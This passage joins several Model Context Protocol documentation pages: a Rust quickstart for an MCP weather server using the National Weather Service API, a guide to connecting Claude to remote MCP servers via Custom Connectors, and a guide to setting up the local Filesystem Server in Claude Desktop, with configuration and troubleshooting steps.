Desktop\n\n<Note>\n\nClaude for Desktop is not yet available on Linux. Linux users can proceed to the [Building a client](/docs/develop/build-client) tutorial to build an MCP client that connects to the server we just built.\n\n</Note>\n\nFirst, make sure you have Claude for Desktop installed.

There's an MCP server named \"weather\"\n2. Launch it by running `dotnet run /ABSOLUTE/PATH/TO/PROJECT`\n   Save the file, and restart **Claude for Desktop**.\n\n</Tab>\n\n<Tab title='Rust'>\n\nLet's get started with building our weather server! [You can find the complete code for what we'll be building here.](https://github.com/modelcontextprotocol/quickstart-resources/tree/main/weather-server-rust)\n\n### Prerequisite knowledge\n\nThis quickstart assumes you have familiarity with:\n\n- Rust programming language\n- Async/await in Rust\n- LLMs like Claude\n\n### Logging in MCP Servers\n\nWhen implementing MCP servers, be careful about how you handle logging:\n\n**For STDIO-based servers:** Never write to standard output (stdout). This includes:\n\n- `print()` statements in Python\n- `console.log()` in JavaScript\n- `println!()` in Rust\n- Similar stdout functions in other languages\n\nWriting to stdout will corrupt the JSON-RPC messages and break your server.\n\n**For HTTP-based servers:** Standard output logging is fine since it doesn't interfere with HTTP responses.\n\n### Best Practices\n\n1. Use a logging library that writes to stderr or files, such as `tracing` or `log` in Rust.\n2. Configure your logging framework to avoid stdout output.\n\n### Quick Examples\n\n```rust\n// ❌ Bad (STDIO)\nprintln!(\"Processing request\");\n\n// ✅ Good (STDIO)\nuse tracing::info;\ninfo!(\"Processing request\"); // writes to stderr\n```\n\n### System requirements\n\n- Rust 1.70 or higher installed.\n- Cargo (comes with Rust installation).\n\n### Set up your environment\n\nFirst, let's install Rust if you haven't already. You can install Rust from [rust-lang.org](https://www.rust-lang.org/tools/install):\n\n<CodeGroup>\n\n```bash macOS/Linux\ncurl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n```\n\n```powershell Windows\n# Download and run rustup-init.exe from https://rustup.rs/\n```\n\n</CodeGroup>\n\nVerify your Rust installation:\n\n```bash\nrustc --version\ncargo --version\n```\n\nNow, let's create and set up our project:\n\n<CodeGroup>\n\n```bash macOS/Linux\n# Create a new Rust project\ncargo new weather\ncd weather\n```\n\n```powershell Windows\n# Create a new Rust project\ncargo new weather\ncd weather\n```\n\n</CodeGroup>\n\nUpdate your `Cargo.toml` to add the required dependencies:\n\n```toml Cargo.toml\n[package]\nname = \"weather\"\nversion = \"0.1.0\"\nedition = \"2024\"\n\n[dependencies]\nrmcp = { version = \"0.3\", features = [\"server\", \"macros\", \"transport-io\"] }\ntokio = { version = \"1.46\", features = [\"full\"] }\nreqwest = { version = \"0.12\", features = [\"json\"] }\nserde = { version = \"1.0\", features = [\"derive\"] }\nserde_json = \"1.0\"\nanyhow = \"1.0\"\ntracing = \"0.1\"\ntracing-subscriber = { version = \"0.3\", features = [\"env-filter\", \"std\", \"fmt\"] }\n```\n\nNow let's dive into building your server.\n\n## Building your server\n\n### Importing packages and constants\n\nOpen `src/main.rs` and add these imports and constants at the top:\n\n```rust\nuse anyhow::Result;\nuse rmcp::{\n    ServerHandler, ServiceExt,\n    handler::server::{router::tool::ToolRouter, tool::Parameters},\n    model::*,\n    schemars, tool, tool_handler, tool_router,\n};\nuse serde::Deserialize;\nuse serde::de::DeserializeOwned;\n\nconst NWS_API_BASE: &str = \"https://api.weather.gov\";\nconst USER_AGENT: &str = \"weather-app/1.0\";\n```\n\nThe `rmcp` crate provides the Model Context Protocol SDK for Rust, with features for server implementation, procedural macros, and stdio transport.\n\n### Data structures\n\nNext, let's define the data structures for deserializing responses from the National Weather Service API:\n\n```rust\n#[derive(Debug, Deserialize)]\nstruct AlertsResponse {\n    features: Vec<AlertFeature>,\n}\n\n#[derive(Debug, Deserialize)]\nstruct AlertFeature {\n    properties: AlertProperties,\n}\n\n#[derive(Debug, Deserialize)]\nstruct AlertProperties {\n    event: Option<String>,\n    #[serde(rename = \"areaDesc\")]\n    area_desc: Option<String>,\n    severity: Option<String>,\n    description: Option<String>,\n    instruction: Option<String>,\n}\n\n#[derive(Debug, Deserialize)]\nstruct PointsResponse {\n    properties: PointsProperties,\n}\n\n#[derive(Debug, Deserialize)]\nstruct PointsProperties {\n    forecast: String,\n}\n\n#[derive(Debug, Deserialize)]\nstruct ForecastResponse {\n    properties: ForecastProperties,\n}\n\n#[derive(Debug, Deserialize)]\nstruct ForecastProperties {\n    periods: Vec<ForecastPeriod>,\n}\n\n#[derive(Debug, Deserialize)]\nstruct ForecastPeriod {\n    name: String,\n    temperature: i32,\n    #[serde(rename = \"temperatureUnit\")]\n    temperature_unit: String,\n    #[serde(rename = \"windSpeed\")]\n    wind_speed: String,\n    #[serde(rename = \"windDirection\")]\n    wind_direction: String,\n    #[serde(rename = \"detailedForecast\")]\n    detailed_forecast: String,\n}\n```\n\nNow define the request types that MCP clients will send:\n\n```rust\n#[derive(serde::Deserialize, schemars::JsonSchema)]\npub struct MCPForecastRequest {\n    latitude: f32,\n    longitude: f32,\n}\n\n#[derive(serde::Deserialize, schemars::JsonSchema)]\npub struct MCPAlertRequest {\n    state: String,\n}\n```\n\n### Helper functions\n\nAdd helper functions for making API requests and formatting responses:\n\n```rust\nasync fn make_nws_request<T: DeserializeOwned>(url: &str) -> Result<T> {\n    let client = reqwest::Client::new();\n    let rsp = client\n        .get(url)\n        .header(reqwest::header::USER_AGENT, USER_AGENT)\n        .header(reqwest::header::ACCEPT, \"application/geo+json\")\n        .send()\n        .await?\n        .error_for_status()?;\n    Ok(rsp.json::<T>().await?)\n}\n\nfn format_alert(feature: &AlertFeature) -> String {\n    let props = &feature.properties;\n    format!(\n        \"Event: {}\\nArea: {}\\nSeverity: {}\\nDescription: {}\\nInstructions: {}\",\n        props.event.as_deref().unwrap_or(\"Unknown\"),\n        props.area_desc.as_deref().unwrap_or(\"Unknown\"),\n        props.severity.as_deref().unwrap_or(\"Unknown\"),\n        props\n            .description\n            .as_deref()\n            .unwrap_or(\"No description available\"),\n        props\n            .instruction\n            .as_deref()\n            .unwrap_or(\"No specific instructions provided\")\n    )\n}\n\nfn format_period(period: &ForecastPeriod) -> String {\n    format!(\n        \"{}:\\nTemperature: {}°{}\\nWind: {} {}\\nForecast: {}\",\n        period.name,\n        period.temperature,\n        period.temperature_unit,\n        period.wind_speed,\n        period.wind_direction,\n        period.detailed_forecast\n    )\n}\n```\n\n### Implementing the Weather server and tools\n\nNow let's implement the main Weather server struct with the tool handlers:\n\n```rust\npub struct Weather {\n    tool_router: ToolRouter<Weather>,\n}\n\n#[tool_router]\nimpl Weather {\n    fn new() -> Self {\n        Self {\n            tool_router: Self::tool_router(),\n        }\n    }\n\n    #[tool(description = \"Get weather alerts for a US state.\")]\n    async fn get_alerts(\n        &self,\n        Parameters(MCPAlertRequest { state }): Parameters<MCPAlertRequest>,\n    ) -> String {\n        let url = format!(\n            \"{}/alerts/active/area/{}\",\n            NWS_API_BASE,\n            state.to_uppercase()\n        );\n\n        match make_nws_request::<AlertsResponse>(&url).await {\n            Ok(data) => {\n                if data.features.is_empty() {\n                    \"No active alerts for this state.\".to_string()\n                } else {\n                    data.features\n                        .iter()\n                        .map(format_alert)\n                        .collect::<Vec<_>>()\n                        .join(\"\\n---\\n\")\n                }\n            }\n            Err(_) => \"Unable to fetch alerts or no alerts found.\".to_string(),\n        }\n    }\n\n    #[tool(description = \"Get weather forecast for a location.\")]\n    async fn get_forecast(\n        &self,\n        Parameters(MCPForecastRequest {\n            latitude,\n            longitude,\n        }): Parameters<MCPForecastRequest>,\n    ) -> String {\n        let points_url = format!(\"{NWS_API_BASE}/points/{latitude},{longitude}\");\n        let Ok(points_data) = make_nws_request::<PointsResponse>(&points_url).await else {\n            return \"Unable to fetch forecast data for this location.\".to_string();\n        };\n\n        let forecast_url = points_data.properties.forecast;\n\n        let Ok(forecast_data) = make_nws_request::<ForecastResponse>(&forecast_url).await else {\n            return \"Unable to fetch forecast data for this location.\".to_string();\n        };\n\n        let periods = &forecast_data.properties.periods;\n        let forecast_summary: String = periods\n            .iter()\n            .take(5) // Next 5 periods only\n            .map(format_period)\n            .collect::<Vec<String>>()\n            .join(\"\\n---\\n\");\n        forecast_summary\n    }\n}\n```\n\nThe `#[tool_router]` macro automatically generates the routing logic, and the `#[tool]` attribute marks methods as MCP tools.\n\n### Implementing the ServerHandler\n\nImplement the `ServerHandler` trait to define server capabilities:\n\n```rust\n#[tool_handler]\nimpl ServerHandler for Weather {\n    fn get_info(&self) -> ServerInfo {\n        ServerInfo {\n            capabilities: ServerCapabilities::builder().enable_tools().build(),\n            ..Default::default()\n        }\n    }\n}\n```\n\n### Running the server\n\nFinally, implement the main function to run the server with stdio transport:\n\n```rust\n#[tokio::main]\nasync fn main() -> Result<()> {\n    let transport = (tokio::io::stdin(), tokio::io::stdout());\n    let service = Weather::new().serve(transport).await?;\n    service.waiting().await?;\n    Ok(())\n}\n```\n\nBuild your server with:\n\n```bash\ncargo build --release\n```\n\nThe compiled binary will be in `target/release/weather`.\n\nLet's now test your server from an existing MCP host, Claude for Desktop.\n\n## Testing your server with Claude for Desktop\n\n<Note>\n\nClaude for Desktop is not yet available on Linux. Linux users can proceed to the [Building a client](/docs/develop/build-client) tutorial to build an MCP client that connects to the server we just built.\n\n</Note>\n\nFirst, make sure you have Claude for Desktop installed. [You can install the latest version here.](https://claude.ai/download) If you already have Claude for Desktop, **make sure it's updated to the latest version.**\n\nWe'll need to configure Claude for Desktop for whichever MCP servers you want to use. To do this, open your Claude for Desktop App configuration at `~/Library/Application Support/Claude/claude_desktop_config.json` in a text editor. Make sure to create the file if it doesn't exist.\n\nFor example, if you have [VS Code](https://code.visualstudio.com/) installed:\n\n<CodeGroup>\n\n```bash macOS/Linux\ncode ~/Library/Application\\ Support/Claude/claude_desktop_config.json\n```\n\n```powershell Windows\ncode $env:AppData\\Claude\\claude_desktop_config.json\n```\n\n</CodeGroup>\n\nYou'll then add your servers in the `mcpServers` key. The MCP UI elements will only show up in Claude for Desktop if at least one server is properly configured.\n\nIn this case, we'll add our single weather server like so:\n\n<CodeGroup>\n\n```json macOS/Linux\n{\n  \"mcpServers\": {\n    \"weather\": {\n      \"command\": \"/ABSOLUTE/PATH/TO/PARENT/FOLDER/weather/target/release/weather\"\n    }\n  }\n}\n```\n\n```json Windows\n{\n  \"mcpServers\": {\n    \"weather\": {\n      \"command\": \"C:\\\\ABSOLUTE\\\\PATH\\\\TO\\\\PARENT\\\\FOLDER\\\\weather\\\\target\\\\release\\\\weather.exe\"\n    }\n  }\n}\n```\n\n</CodeGroup>\n\n<Note>\n\nMake sure you pass in the absolute path to your compiled binary. You can get this by running `pwd` on macOS/Linux or `cd` on Windows Command Prompt from your project directory. On Windows, remember to use double backslashes (`\\\\`) or forward slashes (`/`) in the JSON path, and add the `.exe` extension.\n\n</Note>\n\nThis tells Claude for Desktop:\n\n1. There's an MCP server named \"weather\"\n2. Launch it by running the compiled binary at the specified path\n\nSave the file, and restart **Claude for Desktop**.\n\n</Tab>\n</Tabs>\n\n### Test with commands\n\nLet's make sure Claude for Desktop is picking up the two tools we've exposed in our `weather` server. You can do this by looking for the \"Search and tools\" <img src=\"/images/claude-desktop-mcp-slider.svg\" style={{display: 'inline', margin: 0, height: '1.3em'}} /> icon:\n\n<Frame>\n  <img src=\"/images/visual-indicator-mcp-tools.png\" />\n</Frame>\n\nAfter clicking on the slider icon, you should see two tools listed:\n\n<Frame>\n  <img src=\"/images/available-mcp-tools.png\" />\n</Frame>\n\nIf your server isn't being picked up by Claude for Desktop, proceed to the [Troubleshooting](#troubleshooting) section for debugging tips.\n\nIf the tool settings icon has shown up, you can now test your server by running the following commands in Claude for Desktop:\n\n- What's the weather in Sacramento?\n- What are the active weather alerts in Texas?\n\n<Frame>\n  <img src=\"/images/current-weather.png\" />\n</Frame>\n<Frame>\n  <img src=\"/images/weather-alerts.png\" />\n</Frame>\n\n<Note>\n\nSince this is the US National Weather service, the queries will only work for US locations.\n\n</Note>\n\n## What's happening under the hood\n\nWhen you ask a question:\n\n1. The client sends your question to Claude\n2. Claude analyzes the available tools and decides which one(s) to use\n3. The client executes the chosen tool(s) through the MCP server\n4. The results are sent back to Claude\n5. Claude formulates a natural language response\n6. The response is displayed to you!\n\n## Troubleshooting\n\n<AccordionGroup>\n<Accordion title=\"Claude for Desktop Integration Issues\">\n\n**Getting logs from Claude for Desktop**\n\nClaude.app logging related to MCP is written to log files in `~/Library/Logs/Claude`:\n\n- `mcp.log` will contain general logging about MCP connections and connection failures.\n- Files named `mcp-server-SERVERNAME.log` will contain error (stderr) logging from the named server.\n\nYou can run the following command to list recent logs and follow along with any new ones:\n\n```bash\n# Check Claude's logs for errors\ntail -n 20 -f ~/Library/Logs/Claude/mcp*.log\n```\n\n**Server not showing up in Claude**\n\n1. Check your `claude_desktop_config.json` file syntax\n2. Make sure the path to your project is absolute and not relative\n3. Restart Claude for Desktop completely\n\n<Warning>\n\nTo properly restart Claude for Desktop, you must fully quit the application:\n\n- **Windows**: Right-click the Claude icon in the system tray (which may be hidden in the \"hidden icons\" menu) and select \"Quit\" or \"Exit\".\n- **macOS**: Use Cmd+Q or select \"Quit Claude\" from the menu bar.\n\nSimply closing the window does not fully quit the application, and your MCP server configuration changes will not take effect.\n\n</Warning>\n\n**Tool calls failing silently**\n\nIf Claude attempts to use the tools but they fail:\n\n1. Check Claude's logs for errors\n2. Verify your server builds and runs without errors\n3. Try restarting Claude for Desktop\n\n**None of this is working. What do I do?**\n\nPlease refer to our [debugging guide](/legacy/tools/debugging) for better debugging tools and more detailed guidance.\n\n</Accordion>\n<Accordion title=\"Weather API Issues\">\n\n**Error: Failed to retrieve grid point data**\n\nThis usually means either:\n\n1. The coordinates are outside the US\n2. The NWS API is having issues\n3. You're being rate limited\n\nFix:\n\n- Verify you're using US coordinates\n- Add a small delay between requests\n- Check the NWS API status page\n\n**Error: No active alerts for [STATE]**\n\nThis isn't an error - it just means there are no current weather alerts for that state. Try a different state or check during severe weather.\n\n</Accordion>\n\n</AccordionGroup>\n\n<Note>\n\nFor more advanced troubleshooting, check out our guide on [Debugging MCP](/legacy/tools/debugging)\n\n</Note>\n\n## Next steps\n\n<CardGroup cols={2}>\n  <Card\n    title=\"Building a client\"\n    icon=\"outlet\"\n    href=\"/docs/develop/build-client\"\n  >\n    Learn how to build your own MCP client that can connect to your server\n  </Card>\n  <Card title=\"Example servers\" icon=\"grid\" href=\"/examples\">\n    Check out our gallery of official MCP servers and implementations\n  </Card>\n  <Card title=\"Debugging Guide\" icon=\"bug\" href=\"/legacy/tools/debugging\">\n    Learn how to effectively debug MCP servers and integrations\n  </Card>\n  <Card\n    title=\"Building MCP with LLMs\"\n    icon=\"comments\"\n    href=\"/tutorials/building-mcp-with-llms\"\n  >\n    Learn how to use LLMs like Claude to speed up your MCP development\n  </Card>\n</CardGroup>\n"}

By connecting to remote MCP servers, you transform AI assistants from helpful tools into informed teammates capable of handling complex, multi-step projects with real-time access to external resources.\n\nMany clients now support remote MCP servers, enabling a wide range of integration possibilities. This guide demonstrates how to connect to remote MCP servers using [Claude](https://claude.ai/) as an example, one of the [many clients that support MCP](/clients). While we focus on Claude's implementation through Custom Connectors, the concepts apply broadly to other MCP-compatible clients.\n\n## Understanding Remote MCP Servers\n\nRemote MCP servers function similarly to local MCP servers but are hosted on the internet rather than your local machine. They expose tools, prompts, and resources that Claude can use to perform tasks on your behalf. These servers can integrate with various services such as project management tools, documentation systems, code repositories, and any other API-enabled service.\n\nThe key advantage of remote MCP servers is their accessibility. Unlike local servers that require installation and configuration on each device, remote servers are available from any MCP client with an internet connection. This makes them ideal for web-based AI applications, integrations that emphasize ease-of-use and services that require server-side processing or authentication.\n\n## What are Custom Connectors?\n\nCustom Connectors serve as the bridge between Claude and remote MCP servers. They allow you to connect Claude directly to the tools and data sources that matter most to your workflows, enabling Claude to operate within your favorite software and draw insights from the complete context of your external tools.\n\nWith Custom Connectors, you can:\n\n- [Connect Claude to existing remote MCP servers](https://support.anthropic.com/en/articles/11175166-getting-started-with-custom-connectors-using-remote-mcp) provided by third-party developers\n- [Build your own remote MCP servers to connect with any tool](https://support.anthropic.com/en/articles/11503834-building-custom-connectors-via-remote-mcp-servers)\n\n## Connecting to a Remote MCP Server\n\nThe process of connecting Claude to a remote MCP server involves adding a Custom Connector through the [Claude interface](https://claude.ai/). This establishes a secure connection between Claude and your chosen remote server.\n\n<Steps>\n<Step title=\"Navigate to Connector Settings\">\nOpen Claude in your browser and navigate to the settings page. You can access this by clicking on your profile icon and selecting \"Settings\" from the dropdown menu. Once in settings, locate and click on the \"Connectors\" section in the sidebar.\n\nThis will display your currently configured connectors and provide options to add new ones.\n\n</Step>\n\n<Step title=\"Add a Custom Connector\">\nIn the Connectors section, scroll to the bottom where you'll find the \"Add custom connector\" button. Click this button to begin the connection process.\n\n<Frame>\n  <img\n    src=\"/images/quickstart-remote/1-add-connector.png\"\n    alt=\"Add custom connector button in Claude settings\"\n  />\n</Frame>\n\nA dialog will appear prompting you to enter the remote MCP server URL. This URL should be provided by the server developer or administrator. Enter the complete URL, ensuring it includes the proper protocol (https://) and any necessary path components.\n\n<Frame>\n  <img\n    src=\"/images/quickstart-remote/2-connect.png\"\n    alt=\"Dialog for entering remote MCP server URL\"\n  />\n</Frame>\n\nAfter entering the URL, click \"Add\" to proceed with the connection.\n\n</Step>\n\n<Step title=\"Complete Authentication\">\nMost remote MCP servers require authentication to ensure secure access to their resources. The authentication process varies depending on the server implementation but commonly involves OAuth, API keys, or username/password combinations.\n\n<Frame>\n  <img\n    src=\"/images/quickstart-remote/3-auth.png\"\n    alt=\"Authentication screen for remote MCP server\"\n  />\n</Frame>\n\nFollow the authentication prompts provided by the server. This may redirect you to a third-party authentication provider or display a form within Claude. Once authentication is complete, Claude will establish a secure connection to the remote server.\n\n</Step>\n\n<Step title=\"Access Resources and Prompts\">\nAfter successful connection, the remote server's resources and prompts become available in your Claude conversations. You can access these by clicking the paperclip icon in the message input area, which opens the attachment menu.\n\n<Frame>\n  <img\n    src=\"/images/quickstart-remote/4-select-resources-menu.png\"\n    alt=\"Attachment menu showing available resources\"\n  />\n</Frame>\n\nThe menu displays all available resources and prompts from your connected servers. Select the items you want to include in your conversation. These resources provide Claude with context and information from your external tools.\n\n<Frame>\n  <img src=\"/images/quickstart-remote/5-select-prompts-resources.png\" alt=\"Selecting specific resources and prompts from the menu\" />\n</Frame>\n</Step>\n\n<Step title=\"Configure Tool Permissions\">\nRemote MCP servers often expose multiple tools with varying capabilities. You can control which tools Claude is allowed to use by configuring permissions in the connector settings. This ensures Claude only performs actions you've explicitly authorized.\n\n<Frame>\n  <img\n    src=\"/images/quickstart-remote/6-configure-tools.png\"\n    alt=\"Tool permission configuration interface\"\n  />\n</Frame>\n\nNavigate back to the Connectors settings and click on your connected server. Here you can enable or disable specific tools, set usage limits, and configure other security parameters according to your needs.\n\n</Step>\n</Steps>\n\n## Best Practices for Using Remote MCP Servers\n\nWhen working with remote MCP servers, consider these recommendations to ensure a secure and efficient experience:\n\n**Security considerations**: Always verify the authenticity of remote MCP servers before connecting. Only connect to servers from trusted sources, and review the permissions requested during authentication. Be cautious about granting access to sensitive data or systems.\n\n**Managing multiple connectors**: You can connect to multiple remote MCP servers simultaneously. Organize your connectors by purpose or project to maintain clarity. Regularly review and remove connectors you no longer use to keep your workspace organized and secure.\n\n## Next Steps\n\nNow that you've connected Claude to a remote MCP server, you can explore its capabilities in your conversations. Try using the connected tools to automate tasks, access external data, or integrate with your existing workflows.\n\n<CardGroup cols={2}>\n  <Card\n    title=\"Build your own remote server\"\n    icon=\"cloud\"\n    href=\"https://support.anthropic.com/en/articles/11503834-building-custom-connectors-via-remote-mcp-servers\"\n  >\n    Create custom remote MCP servers to integrate with proprietary tools and\n    services\n  </Card>\n  <Card\n    title=\"Explore available servers\"\n    icon=\"grid\"\n    href=\"https://github.com/modelcontextprotocol/servers\"\n  >\n    Browse our collection of official and community-created MCP servers\n  </Card>\n  <Card\n    title=\"Connect local servers\"\n    icon=\"computer\"\n    href=\"/docs/develop/connect-local-servers\"\n  >\n    Learn how to connect Claude Desktop to local MCP servers for direct system\n    access\n  </Card>\n  <Card\n    title=\"Understand the architecture\"\n    icon=\"book\"\n    href=\"/docs/learn/architecture\"\n  >\n    Dive deeper into how MCP works and its architecture\n  </Card>\n</CardGroup>\n\nRemote MCP servers unlock powerful possibilities for extending Claude's capabilities.

{"source":"github","repo":"mcp-spec","path":"docs/docs/develop/connect-local-servers.mdx","content":"---\ntitle: Connect to local MCP servers\ndescription: Learn how to extend Claude Desktop with local MCP servers to enable file system access and other powerful integrations\n---\n\nModel Context Protocol (MCP) servers extend AI applications' capabilities by providing secure, controlled access to local resources and tools. Many clients support MCP, enabling diverse integration possibilities across different platforms and applications.\n\nThis guide demonstrates how to connect to local MCP servers using Claude Desktop as an example, one of the [many clients that support MCP](/clients). While we focus on Claude Desktop's implementation, the concepts apply broadly to other MCP-compatible clients. By the end of this tutorial, Claude will be able to interact with files on your computer, create new documents, organize folders, and search through your file system—all with your explicit permission for each action.\n\n<Frame>\n  <img\n    src=\"/images/quickstart-filesystem.png\"\n    alt=\"Claude Desktop with filesystem integration showing file management capabilities\"\n  />\n</Frame>\n\n## Prerequisites\n\nBefore starting this tutorial, ensure you have the following installed on your system:\n\n### Claude Desktop\n\nDownload and install [Claude Desktop](https://claude.ai/download) for your operating system. Claude Desktop is available for macOS and Windows.\n\nIf you already have Claude Desktop installed, verify you're running the latest version by clicking the Claude menu and selecting \"Check for Updates...\"\n\n### Node.js\n\nThe Filesystem Server and many other MCP servers require Node.js to run. Verify your Node.js installation by opening a terminal or command prompt and running:\n\n```bash\nnode --version\n```\n\nIf Node.js is not installed, download it from [nodejs.org](https://nodejs.org/). We recommend the LTS (Long Term Support) version for stability.\n\n## Understanding MCP Servers\n\nMCP servers are programs that run on your computer and provide specific capabilities to Claude Desktop through a standardized protocol. Each server exposes tools that Claude can use to perform actions, with your approval. The Filesystem Server we'll install provides tools for:\n\n- Reading file contents and directory structures\n- Creating new files and directories\n- Moving and renaming files\n- Searching for files by name or content\n\nAll actions require your explicit approval before execution, ensuring you maintain full control over what Claude can access and modify.\n\n## Installing the Filesystem Server\n\nThe process involves configuring Claude Desktop to automatically start the Filesystem Server whenever you launch the application. This configuration is done through a JSON file that tells Claude Desktop which servers to run and how to connect to them.\n\n<Steps>\n<Step title=\"Open Claude Desktop Settings\">\nStart by accessing the Claude Desktop settings. Click on the Claude menu in your system's menu bar (not the settings within the Claude window itself) and select \"Settings...\"\n\nOn macOS, this appears in the top menu bar:\n\n<Frame style={{ textAlign: \"center\" }}>\n  <img\n    src=\"/images/quickstart-menu.png\"\n    width=\"400\"\n    alt=\"Claude Desktop menu showing Settings option\"\n  />\n</Frame>\n\nThis opens the Claude Desktop configuration window, which is separate from your Claude account settings.\n\n</Step>\n\n<Step title=\"Access Developer Settings\">\nIn the Settings window, navigate to the \"Developer\" tab in the left sidebar. This section contains options for configuring MCP servers and other developer features.\n\nClick the \"Edit Config\" button to open the configuration file:\n\n<Frame>\n  <img\n    src=\"/images/quickstart-developer.png\"\n    alt=\"Developer settings showing Edit Config button\"\n  />\n</Frame>\n\nThis action creates a new configuration file if one doesn't exist, or opens your existing configuration. The file is located at:\n\n- **macOS**: `~/Library/Application Support/Claude/claude_desktop_config.json`\n- **Windows**: `%APPDATA%\\Claude\\claude_desktop_config.json`\n\n</Step>\n\n<Step title=\"Configure the Filesystem Server\">\nReplace the contents of the configuration file with the following JSON structure. This configuration tells Claude Desktop to start the Filesystem Server with access to specific directories:\n\n<CodeGroup>\n\n```json macOS\n{\n  \"mcpServers\": {\n    \"filesystem\": {\n      \"command\": \"npx\",\n      \"args\": [\n        \"-y\",\n        \"@modelcontextprotocol/server-filesystem\",\n        \"/Users/username/Desktop\",\n        \"/Users/username/Downloads\"\n      ]\n    }\n  }\n}\n```\n\n```json Windows\n{\n  \"mcpServers\": {\n    \"filesystem\": {\n      \"command\": \"npx\",\n      \"args\": [\n        \"-y\",\n        \"@modelcontextprotocol/server-filesystem\",\n        \"C:\\\\Users\\\\username\\\\Desktop\",\n        \"C:\\\\Users\\\\username\\\\Downloads\"\n      ]\n    }\n  }\n}\n```\n\n</CodeGroup>\n\nReplace `username` with your actual computer username. The paths listed in the `args` array specify which directories the Filesystem Server can access. You can modify these paths or add additional directories as needed.\n\n<Tip>\n**Understanding the Configuration**\n\n- `\"filesystem\"`: A friendly name for the server that appears in Claude Desktop\n- `\"command\": \"npx\"`: Uses Node.js's npx tool to run the server\n- `\"-y\"`: Automatically confirms the installation of the server package\n- `\"@modelcontextprotocol/server-filesystem\"`: The package name of the Filesystem Server\n- The remaining arguments: Directories the server is allowed to access\n\n</Tip>\n\n<Warning>\n**Security Consideration**\n\nOnly grant access to directories you're comfortable with Claude reading and modifying. The server runs with your user account permissions, so it can perform any file operations you can perform manually.\n\n</Warning>\n</Step>\n\n<Step title=\"Restart Claude Desktop\">\nAfter saving the configuration file, completely quit Claude Desktop and restart it. The application needs to restart to load the new configuration and start the MCP server.\n\nUpon successful restart, you'll see an MCP server indicator <img src=\"/images/claude-desktop-mcp-slider.svg\" style={{display: 'inline', margin: 0, height: '1.3em'}} /> in the bottom-right corner of the conversation input box:\n\n<Frame>\n  <img\n    src=\"/images/quickstart-slider.png\"\n    alt=\"Claude Desktop interface showing MCP server indicator\"\n  />\n</Frame>\n\nClick on this indicator to view the available tools provided by the Filesystem Server:\n\n<Frame style={{ textAlign: \"center\" }}>\n  <img\n    src=\"/images/quickstart-tools.png\"\n    width=\"400\"\n    alt=\"Available filesystem tools in Claude Desktop\"\n  />\n</Frame>\n\nIf the server indicator doesn't appear, refer to the [Troubleshooting](#troubleshooting) section for debugging steps.\n\n</Step>\n</Steps>\n\n## Using the Filesystem Server\n\nWith the Filesystem Server connected, Claude can now interact with your file system. Try these example requests to explore the capabilities:\n\n### File Management Examples\n\n- **\"Can you write a poem and save it to my desktop?\"** - Claude will compose a poem and create a new text file on your desktop\n- **\"What work-related files are in my downloads folder?\"** - Claude will scan your downloads and identify work-related documents\n- **\"Please organize all images on my desktop into a new folder called 'Images'\"** - Claude will create a folder and move image files into it\n\n### How Approval Works\n\nBefore executing any file system operation, Claude will request your approval. This ensures you maintain control over all actions:\n\n<Frame style={{ textAlign: \"center\" }}>\n  <img\n    src=\"/images/quickstart-approve.png\"\n    width=\"500\"\n    alt=\"Claude requesting approval to perform a file operation\"\n  />\n</Frame>\n\nReview each request carefully before approving. You can always deny a request if you're not comfortable with the proposed action.\n\n## Troubleshooting\n\nIf you encounter issues setting up or using the Filesystem Server, these solutions address common problems:\n\n<AccordionGroup>\n<Accordion title=\"Server not showing up in Claude / hammer icon missing\">\n\n1. Restart Claude Desktop completely\n2. Check your `claude_desktop_config.json` file syntax\n3. Make sure the file paths included in `claude_desktop_config.json` are valid and that they are absolute and not relative\n4. Look at [logs](#getting-logs-from-claude-for-desktop) to see why the server is not connecting\n5. In your command line, try manually running the server (replacing `username` as you did in `claude_desktop_config.json`) to see if you get any errors:\n\n<CodeGroup>\n\n```bash macOS/Linux\nnpx -y @modelcontextprotocol/server-filesystem /Users/username/Desktop /Users/username/Downloads\n```\n\n```powershell Windows\nnpx -y @modelcontextprotocol/server-filesystem C:\\Users\\username\\Desktop C:\\Users\\username\\Downloads\n```\n\n</CodeGroup>\n\n</Accordion>\n<Accordion title=\"Getting logs from Claude Desktop\">\n\nClaude.app logging related to MCP is written to log files in:\n\n- macOS: `~/Library/Logs/Claude`\n- Windows: `%APPDATA%\\Claude\\logs`\n\n- `mcp.log` will contain general logging about MCP connections and connection failures.\n- Files named `mcp-server-SERVERNAME.log` will contain error (stderr) logging from the named server.\n\nYou can run the following command to list recent logs and follow along with any new ones (on Windows, it will only show recent logs):\n\n<CodeGroup>\n\n```bash macOS/Linux\ntail -n 20 -f ~/Library/Logs/Claude/mcp*.log\n```\n\n```powershell Windows\ntype \"%APPDATA%\\Claude\\logs\\mcp*.log\"\n```\n\n</CodeGroup>\n\n</Accordion>\n<Accordion title=\"Tool calls failing silently\">\n\nIf Claude attempts to use the tools but they fail:\n\n1. Check Claude's logs for errors\n2. Verify your server builds and runs without errors\n3. Try restarting Claude Desktop\n\n</Accordion>\n<Accordion title=\"None of this is working. What do I do?\">\n\nPlease refer to our [debugging guide](/legacy/tools/debugging) for better debugging tools and more detailed guidance.\n\n</Accordion>\n<Accordion title=\"ENOENT error and `${APPDATA}` in paths on Windows\">\n\nIf your configured server fails to load, and you see within its logs an error referring to `${APPDATA}` within a path, you may need to add the expanded value of `%APPDATA%` to your `env` key in `claude_desktop_config.json`:\n\n```json\n{\n  \"brave-search\": {\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-brave-search\"],\n    \"env\": {\n      \"APPDATA\": \"C:\\\\Users\\\\user\\\\AppData\\\\Roaming\\\\\",\n      \"BRAVE_API_KEY\": \"...\"\n    }\n  }\n}\n```\n\nWith this change in place, launch Claude Desktop once again.\n\n<Warning>\n\n**npm should be installed globally**\n\nThe `npx` command may continue to fail if you have not installed npm globally. If npm is already installed globally, you will find `%APPDATA%\\npm` exists on your system.

